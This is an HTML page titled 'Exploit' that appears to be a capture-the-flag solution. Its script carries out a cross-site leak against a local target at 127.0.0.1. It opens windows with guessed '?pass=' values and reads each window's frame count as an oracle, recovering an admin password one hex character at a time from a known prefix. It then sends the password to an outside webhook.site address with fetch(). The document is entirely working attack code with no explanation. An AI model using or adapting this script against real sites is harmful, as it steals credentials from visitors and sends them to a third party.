<!DOCTYPE html>
<html>
<head><title>Exploit</title></head>
<body>
<h1>Leaking admin password...</h1>
<pre id="output"></pre>
<script>
const output = document.getElementById('output');
const TARGET = 'https://127.0.0.1:9999/';
const CHARSET = '0123456789abcdef';
let knownPassword = 'lebah'; // Known prefix

function log(msg) {
    output.textContent += msg + '\n';
    console.log(msg);
}

async function testSubstring(substr) {
    return new Promise((resolve) => {
        const win = window.open(TARGET + '?pass=' + encodeURIComponent(substr));
        
        // Wait for page to load
        setTimeout(() => {
            try {
                const frameCount = win.length;
                win.close();
                resolve(frameCount > 0);
            } catch(e) {
                win.close();
                resolve(false);
            }
        }, 2000);
    });
}

async function leakPassword() {
    log('Starting password leak...');
    log('Known prefix: ' + knownPassword);
    
    // Leak remaining 12 hex chars
    for (let i = 0; i < 12; i++) {
        log(`\nTrying position ${knownPassword.length}...`);
        
        for (let c of CHARSET) {
            const candidate = knownPassword + c;
            log(`  Testing: ${candidate}`);
            
            const isMatch = await testSubstring(candidate);
            
            if (isMatch) {
                knownPassword = candidate;
                log(`  âœ“ MATCH! Password so far: ${knownPassword}`);
                break;
            }
        }
    }
    
    log('\n=== FINAL PASSWORD ===');
    log(knownPassword);
    log('\nExfiltrating to attacker server...');
    
    // Exfiltrate the password
    fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?password=' + encodeURIComponent(knownPassword));
}

// Start the attack after a short delay
setTimeout(leakPassword, 1000);
</script>
</body>
</html>
